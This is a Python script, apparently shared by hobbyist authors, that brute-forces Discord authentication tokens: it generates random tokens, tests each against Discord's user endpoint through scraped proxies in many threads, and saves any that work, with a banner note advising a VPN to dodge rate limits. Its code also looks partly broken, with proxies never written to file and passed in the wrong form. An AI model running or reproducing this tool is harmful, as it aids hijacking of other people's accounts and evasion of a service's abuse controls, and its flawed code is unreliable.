# Created by simonboiii\vivid\landen
# Fixed + Extra code by $ twies

import requests
import os
import random
import threading
from colorama import Fore
from colorama import init



init(convert=True)

style=f'{Fore.CYAN}[{Fore.RESET}${Fore.CYAN}]{Fore.RESET}'

session = requests.Session()
session.trust_env = False
proxylist=[]
def proxies():
    r = requests.get("https://api.proxyscrape.com?request=getproxies&proxytype=http")
    rformat = r.text.strip()
    rformat = rformat.replace("\r","")
    rlist = list(rformat.split("\n"))
    with open("proxies.txt", "w") as x:
        for proxy in rlist:
            proxylist.append(proxy)
            
            
def checker():
    while True:
        proxy=random.choice(proxylist)
        chars = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890"
        a = "".join(random.choice(chars) for x in range(20))
        b = "".join(random.choice(chars) for x in range(6))
        c = "".join(random.choice(chars) for x in range(27))
        token = "OTIw" + a + "." + b + "." + c
        r=session.get('https://discord.com/api/v9/users/@me',headers={"Authorization": token},proxies=proxy)
        if r.status_code == 200:
            print(f"{Fore.GREEN}  Valid {Fore.CYAN}| {Fore.RESET}{token}")
            file = open('valid.txt', 'w')
            file.write(f'{token}\n')
        elif r.status_code == 429:
            print(f"{Fore.YELLOW}  Rate Limited {Fore.YELLOW}[{Fore.RESET}429{Fore.YELLOW}] {Fore.CYAN}| {Fore.RESET}{token}")
        else:
            print(f"{Fore.RED}  Invalid {Fore.CYAN}| {Fore.RESET}{token}")

def main():
    os.system('cls & mode 82,24')
    print()
    print(f'''
{Fore.BLUE}       ╔╦╗╔═╗╦╔═╔═╗╔╗╔  ╔═╗╔═╗╔╗╔
{Fore.LIGHTBLUE_EX} AR     ║ ║ ║╠╩╗║╣ ║║║  ║ ╦║╣ ║║║ {Fore.RESET} AND CHECKER
{Fore.CYAN}        ╩ ╚═╝╩ ╩╚═╝╝╚╝  ╚═╝╚═╝╝╚╝
   
                   {Fore.RED}NOTE: Use a vpn because you will get rate limited I'll fix the proxies soon
''')
    print('  '+style+' Getting proxies...')
    proxies()
    print()
    threads=input('  '+style+f' How Many Threads?{Fore.CYAN}: {Fore.RESET}')
    print()
    for i in range(int(threads)):
        threading.Thread(target=checker).start()
      

if __name__=='__main__':
    main()
